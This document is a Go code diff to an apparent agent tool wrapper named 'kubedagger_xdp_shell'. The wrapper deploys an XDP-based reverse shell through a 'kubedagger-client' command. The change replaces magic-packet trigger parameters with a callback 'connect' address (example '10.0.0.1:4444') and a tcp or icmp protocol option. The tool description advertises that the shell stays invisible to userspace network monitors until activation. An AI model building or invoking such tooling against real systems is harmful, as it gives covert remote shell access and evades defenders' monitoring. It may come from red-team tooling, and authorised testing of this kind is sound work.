@@ -11,11 +11,8 @@ import (
 )
 
 type XDPShellInput struct {
-	Action    string `json:"action"`
-	Interface string `json:"interface,omitempty"`
-	Port      int    `json:"port,omitempty"`
-	Secret    string `json:"secret,omitempty"`
-	Callback  string `json:"callback,omitempty"`
+	Connect  string `json:"connect,omitempty"`
+	Protocol string `json:"protocol,omitempty"`
 }
 
 type XDPShellTool struct {
@@ -29,36 +26,23 @@ func NewXDPShell(exec executor.Executor) *XDPShellTool {
 func (t *XDPShellTool) Name() string { return "kubedagger_xdp_shell" }
 
 func (t *XDPShellTool) Description() string {
-	return "Deploy an XDP-based reverse shell that triggers on a specific magic packet. The shell operates entirely in kernel space for the trigger mechanism, making it invisible to userspace network monitors until activation."
+	return "Deploy an XDP-based reverse shell that connects back to a listener at the given ip:port. The trigger operates at the packet-processing layer, making it invisible to userspace network monitors until activation."
 }
 
 func (t *XDPShellTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"connect": {
 				"type": "string",
-				"enum": ["deploy", "trigger", "remove", "status"],
-				"description": "XDP shell action"
+				"description": "Callback listener as ip:port, e.g. '10.0.0.1:4444'"
 			},
-			"interface": {
+			"protocol": {
 				"type": "string",
-				"description": "Network interface to attach XDP program"
-			},
-			"port": {
-				"type": "integer",
-				"description": "Callback port for reverse shell"
-			},
-			"secret": {
-				"type": "string",
-				"description": "Magic packet secret for shell trigger"
-			},
-			"callback": {
-				"type": "string",
-				"description": "Callback IP address for reverse shell"
+				"enum": ["tcp", "icmp"],
+				"description": "Callback protocol (default: tcp)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -68,30 +52,16 @@ func (t *XDPShellTool) Execute(ctx context.Context, params json.RawMessage) (*mc
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Interface, "interface"); err != nil {
+	if err := validateIPPort(input.Connect); err != nil {
 		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.Secret, "secret"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if input.Callback != "" {
-		if err := validateIP(input.Callback); err != nil {
-			return errorResult(err.Error()), nil
-		}
 	}
 
-	args := []string{"xdp-shell", "--action", input.Action}
-	if input.Interface != "" {
-		args = append(args, "--interface", input.Interface)
+	args := []string{"xdp-shell"}
+	if input.Connect != "" {
+		args = append(args, "--connect", input.Connect)
 	}
-	if input.Port > 0 {
-		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
-	}
-	if input.Secret != "" {
-		args = append(args, "--secret", input.Secret)
-	}
-	if input.Callback != "" {
-		args = append(args, "--callback", input.Callback)
+	if input.Protocol != "" {
+		args = append(args, "--protocol", input.Protocol)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -105,7 +75,7 @@ func (t *XDPShellTool) Execute(ctx context.Context, params json.RawMessage) (*mc
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger XDP Shell: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger XDP Shell\n\n")
 	if output == "" {
 		sb.WriteString("Operation completed.\n")
 	} else {
